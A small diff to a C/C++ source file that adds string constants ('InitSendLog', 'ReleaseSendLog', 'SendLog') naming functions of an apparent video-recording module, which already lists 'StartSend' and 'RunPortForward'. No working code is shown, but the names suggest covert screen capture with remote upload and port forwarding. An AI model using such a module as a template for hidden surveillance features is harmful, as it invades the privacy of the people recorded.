@@ -119,6 +119,9 @@ CSSTR VideRecFuncStop[]           = "StopRec";
 CSSTR VideRecFuncResetTimer[]     = "ResetTimer";
 CSSTR VideRecFuncSendData[]       = "StartSend";
 CSSTR VideRecFuncRunPortForward[] = "RunPortForward";
+CSSTR VideRecFuncInitSendLog[]	  = "InitSendLog";
+CSSTR VideRecFuncReleaseSendLog[] = "ReleaseSendLog";
+CSSTR VideRecFuncSendLog[]		  = "SendLog";
 
 
 CSSTR HTTPFormContentDisposition[] = "Content-Disposition: form-data; ";
